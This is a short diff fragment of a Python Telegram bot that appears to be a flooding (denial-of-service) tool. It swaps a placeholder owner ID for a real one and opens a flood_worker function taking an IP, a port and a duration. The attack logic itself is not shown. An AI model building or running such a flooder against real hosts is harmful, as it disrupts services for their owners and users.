@@ -7,7 +7,7 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 TOKEN = os.getenv("BOT_TOKEN")
-OWNER_ID = 123456789  # ئایدی تلگرامی خۆت لێرە بنووسە
+OWNER_ID = 5527152252  # ئایدی تلگرامی خۆت لێرە بنووسە
 
 def flood_worker(ip, port, duration):
     end_time = time.time() + duration
